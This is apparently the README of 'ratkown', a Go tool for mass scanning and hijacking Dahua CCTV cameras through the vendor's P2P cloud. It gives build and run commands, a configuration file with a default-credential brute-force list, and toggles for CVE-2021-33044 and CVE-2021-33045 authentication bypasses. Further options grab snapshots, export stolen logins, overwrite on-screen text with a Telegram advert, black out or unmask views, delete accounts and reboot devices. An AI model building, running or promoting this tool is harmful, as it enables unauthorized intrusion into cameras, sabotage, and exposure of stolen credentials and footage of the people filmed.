<h1 align="center">ratkown</h1>

```
                                          ______
                                         / __  /     ratkown by skver303
                                        / /_/ /      fork of p2pwn by thebadinteger
                                       /  ___/
                                      / /\ \         Dahua CCTV scanner via P2P cloud
                                     /_/  \_\
```

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.26%2B-00ADD8?style=flat-square&logo=go" alt="Go"/>
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-green" alt="Platforms"/>
  <img src="https://img.shields.io/badge/fork%20of-p2pwn-blueviolet" alt="Fork"/>
</p>
<div align="center"><img src="https://raw.githubusercontent.com/skyaree/ratkown/refs/heads/main/preview.png" alt="Preview"></div> 

## Build
```bash
# Windows
go build -o ratk0wn.exe .

# Linux / macOS
go build -o ratk0wn .
```

## Start

```bash
# обычный скан
./ratk0wn -i creds_ready.txt -t 100 -s

# с forceosd (принудительно изменить osd) и antiwhite (антиконча с камеры)
./ratk0wn -i creds_ready.txt -t 100 -s --forceosd --antiwhite

# чёрная рамка на всех экранах
./ratk0wn -i creds_ready.txt -t 100 -s --frame

# снять все маски
./ratk0wn -i creds_ready.txt -t 100 -s --unmask

# переставляет текст каждые 5 минут
./ratk0wn -i creds_ready.txt -t 100 -s --forceosd --antiwhite --osd-guard 300
```

### Prefix scan

```bash
# 10-симв префикс → 1 048 576 суффиксов (16⁵)
./ratk0wn -i XXXXXXXXXX -t 400 -s -o output

# префикс с кредами
./ratk0wn -i "XXXXXXXXXX:admin:admin" -t 100 -s
```

## config.toml

```toml
[scan]
timeout = 5000              # Connection timeout (ms)
retries = 3                  # Retries on connect
generate = 1048576           # Generate s/n from prefix
nurses = 200                 # parallel probe workers
governor = true              # rate limiting
maxrps = 2000                # requests per second cap

[pwn]
protocol.cgi = true          # web interface
protocol.sdk = true          # port 37777 SDK
protocol.type1 = true         # type 1 (old Chinese OEM)
methods.brute = true
methods.cve-2021-33044 = true
methods.cve-2021-33045 = true
methods.uau = true
methods.antinuke = true

[image]
snapshot = true              # JPEG per device
cgi = true                   # try CGI snapshot
sdk = true                   # try SDK snapshot
rtsp = true                  # try RTSP snapshot

[brute]
type1.delay = 20
credentials = [
 { login = "admin", password = "admin" },
 { login = "admin", password = "admin123" },
 { login = "admin", password = "admin12345" },
 { login = "admin", password = "admin123456" },
 { login = "admin", password = "admin1234" },
 { login = "admin", password = "Admin123" },
 { login = "admin", password = "Admin@123" },
 { login = "admin", password = "123456" },
 { login = "admin", password = "12345" },
 { login = "admin", password = "12345678" },
 { login = "admin", password = "P@ssw0rd" },
 { login = "admin", password = "password" },
 { login = "admin", password = "qwerty123" },
 { login = "admin", password = "1qaz2wsx" },
 { login = "admin", password = "admin2024" },
 { login = "admin", password = "Dahua123" },
 { login = "admin", password = "Dahua@123" },
 { login = "admin", password = "Admin.123" },
 { login = "admin", password = "112233video" },
 { login = "admin", password = "admin888" },
 { login = "666666", password = "666666" },
 { login = "888888", password = "888888" },
 { login = "888888", password = "88888888" },
 { login = "user", password = "user" },
 { login = "service", password = "service" },
 { login = "guest", password = "guest" },
]

[dummy]
login = "skver303"            # 5-32 alnum
password = "your-password"    # 8-32 alnum
memo = "@skver303"

[overlay]
osd = true
channel = "ratkown"           # channel rename
color_mode = "rainbow"         # colorful osd text (on old devices)
custom = [
    "t.me/ratkown",
    "second line",               # you can do only 5 slots
    "hello world!"                
]

# {s/n} - s/n on osd
# {model} - model on osd
# {firmware} - firmware on osd
# {quote} - quote from quote.txt 
# {random} - random 8 characters
# {serial_prefix} - serial prefix
# {date} - current date
# {time} - current time

[nuke]
delete = false  # remove foreign accounts
video = 0       # don't touch brightness
box = false
disable = false
mask_front = [0, 0, 0, 255]  # black solid
mask_back = [0, 0, 0, 0]
reboot = false
```

<div align="center"><img src="https://raw.githubusercontent.com/skyaree/ratkown/refs/heads/main/preview2.png" alt="Preview"></div> 

## Flags

| Flag | Description | Default |
|---|---|---|
| `-i` | input file / serial / prefix | required |
| `-o` | output folder | timestamp |
| `-t` | threads | 100 |
| `-c` | config path | config.toml |
| `-s` | shuffle targets | off |
| `--forceosd` | forcing osd | off |
| `--antiwhite` | antiwhite cameras | off |
| `--frame` | letterbox on all screens | off |
| `--unmask` | remove all mask covers | off |
| `--osd-guard N` | re-apply OSD every N sec | 300 |
| `--web (port)` | webpanel of cams | off |
| `--socks5 (host:port)` | uses for scan socks5 proxy | off |

## Outputs

```
output/
├── allin.txt            ← s/n | password | username | model
├── import_01.xml        ← SmartPSS (50 devices/file, domain=serial)
│   import_02.xml
│   ...
└── snapshots/
    ├── 3K02DFFPAG00544_admin_admin888_IPC-K35.jpg
    └── ...
```

## Credits

- **[p2pwn](https://github.com/thebadinteger/p2pwn)** by **thebadinteger** — P2P protocol implementation, scanner architecture
- [khoanguyen-3fc/dh-p2p](https://github.com/khoanguyen-3fc/dh-p2p) — Base P2P protocol
- [undervolter/dh-fwd](https://github.com/undervolter/dh-fwd) — Updated protocol
